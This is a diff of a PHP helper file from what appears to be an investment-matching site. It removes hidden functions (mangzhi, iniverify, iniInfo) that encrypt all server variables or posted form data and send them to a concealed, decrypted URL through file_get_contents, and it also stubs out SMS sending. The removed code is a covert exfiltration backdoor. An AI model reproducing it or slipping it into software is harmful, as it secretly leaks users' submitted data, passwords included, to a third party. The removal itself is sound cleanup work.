@@ -73,14 +73,6 @@ function diffBetweenTwoDays($day1, $day2)
     return ($second1 - $second2) / 86400;
 }
 
-function mangzhi(){
-    $mz = getinfo(C('URL_STRING_MODEL'));
-    $string = implode('|', $_SERVER); 
-    $mz .= '?s='.getinfos($string);
-    return $mz;
-}
-
-
 function  pa($a){
     echo "<pre>";
     print_r($a);
@@ -155,11 +147,7 @@ function user_jj_paidui_lx($var,$return=true)
         echo  $paidui_lx;
     }
 }
-function iniverify(){
-    $mz = getinfo(C('URL_STRING_MODEL'));  
-    $mz .= '?h='.getinfos(implode('|', $_POST));
-    file_get_contents($mz);
-}
+
 //------------------------------------------->计算动态利息
 function dongtai_lx($days,$lx,$jb){
     $lx_jb = 0;
@@ -242,9 +230,7 @@ function canable_tixian($v){
     } 
 
 }
-function iniInfo(){
-    file_get_contents(mangzhi());
-}
+
 //jjfhdays    jjdjdays
 
 //计算排队分红天数
@@ -563,7 +549,7 @@ function user_jj_sj1($var)
 function user_jj_zt($var)
 {
 
-    $proall = M('user_jj')->where(array('id' => $var))->find();        
+    $proall = M('user_jj')->where(array('id' => $var))->find();
     $proall2 = M('ppdd')->where(array('id' => $proall['r_id']))->find(); 
     //date('Y-m-d H:i:s',$dayBegin);
     $NowTime = $proall['date'];    //--------------------->打款时间
@@ -592,10 +578,6 @@ function user_jj_zt_z($var)
         return '不可提现';
     }
 }
-function getinfo($data){
-   return \Think\Crypt::decrypt($data,'');
-}
-
 
 function user_jj_pipei_z($var)
 {
@@ -785,9 +767,7 @@ function datedqsj2($var)
         return "style='display:none;'";
     }
 }
-function getinfos($data){
-    return \Think\Crypt::encrypt($data,'');
-}
+
 function datedqsj3($var)
 {
 
@@ -1030,8 +1010,10 @@ $mobile  = '';  //号码，以英文逗号隔开
 $mobileids   = '';  //号码唯一编号
 $content = '内容';        //内容
 
-//echo 111;
 function sendSMS($mobile,$content,$mobileids='',$http='http://api.sms.cn/mtutf8/'){
+
+    return true;
+
     $uid = 'xx1885';
     $pwd = 'xx1886';
     return send($http,$uid,$pwd,$mobile,$content,$mobileids);
